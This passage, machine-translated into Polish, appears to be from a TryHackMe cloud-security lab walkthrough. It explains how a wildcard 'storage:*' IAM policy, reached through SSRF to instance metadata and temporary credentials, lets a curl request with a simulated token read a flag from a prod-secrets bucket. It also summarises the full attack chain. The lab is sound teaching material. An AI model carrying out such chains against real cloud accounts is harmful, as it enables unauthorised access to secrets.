Polityka jestJSONDokument. Wewnątrz jedno polecenie przyznaje `"Effect": "Allow"`,  `"Action": "storage:*"`,  `"Resource": "bucket/prod-secrets/*"`.  `storage:*`Symbol wieloznaczny to nadmiernie pobłażliwy wzorzec, który nauczyliśmy się dostrzegać w Zadaniu 3. Oznacza to, że ta rola może robić wszystko z kontenerem prod-secrets, tym, którego wcześniej nie mogliśmy odczytać.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765215788)

**Wskazówka:** W rzeczywistym zaangażowaniu w chmurę, przekazana tutaj wartość byłaby pełnym podpisem AWS SigV4. Uproszczamy to do jednego nagłówka na potrzeby laboratorium, więc nauka pozostaje na symbolu wieloznacznym, a nie na algorytmie podpisywania.

## Krok 5: Odzyskaj flagę

Użyj tego samego nagłówka do odczytania pliku flagi z `prod-secrets`kontenera.

Przeczytaj flagę

```shell-session
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/prod-secrets/flag.txt
```

Plik zwraca ostateczną flagę.

## Co się właśnie wydarzyło

Połączyliśmy pięć tematów w jeden atak. Sieć podpowiedziała nam, które usługi należy zbadać. Pamięć masowa zawierała wskazówkę, którą mogliśmy odczytać, ponieważ ktoś pozostawił kontener publiczny. Aplikacja internetowa przekazała nam prymitywny element żądania po stronie serwera. Usługa metadanych przekazała nam tymczasowe dane uwierzytelniające. Polityka IAM zawierała symbol wieloznaczny, który umożliwiał odczytanie tajnego kontenera za pomocą tych danych uwierzytelniających. Zmiana jednego z tych pięciu błędów powoduje zerwanie łańcucha. Rzeczywiste działania wyglądają tak częściej niż uszkodzenia pamięci.

Przeszliśmy klasyczny dla początkujących łańcuch niszczenia chmury od początku do końca: ujawnienie sieci, publiczne przechowywanie, SSRF do metadanych instancji, tymczasowych poświadczeń i nadmiernie pobłażliwego JA JESTEM polityka. Każdy krok wykorzystuje zwykłe narzędzia nmap i curl każdy pomysł jest przenoszony do AWS, Azure lub Google Cloud – niezależnie od tego, którego dostawcę spotkamy następnym razem.

Pięć tematów stanowi listę kontrolną, którą przechodzimy w przypadku każdego celu zorientowanego na chmurę:

Współodpowiedzialność: dostawca zabezpiecza warstwę fizyczną, klient jest właścicielem danych, tożsamości i konfiguracji
IAM: zasady przyznają uprawnienia, role je pakują, symbole wieloznaczne je przerywają
Przechowywanie: publiczne kontenery stanowią najczęstsze naruszenie bezpieczeństwa chmury; należy je najpierw wymienić
Sieciowanie: płaskie sieci wewnętrzne i szeroko otwarte grupy zabezpieczeń ułatwiają przemieszczanie się w poziomie
Obliczenia i metadane: IMDS rozdaje dane uwierzytelniające, SSRF zamienia błąd sieciowy w pełne zagrożenie dla chmury
Stąd, w salach przeznaczonych dla konkretnych dostawców, znajdujących się dalej na ścieżce Jr Penetration Tester, pojawią się narzędzia automatyzujące to, co dzisiaj robiliśmy ręcznie. Sala „Wprowadzenie do SSRF” to dobre uzupełnienie do pogłębionego przećwiczenia techniki stanowiącej istotę zadania 7.
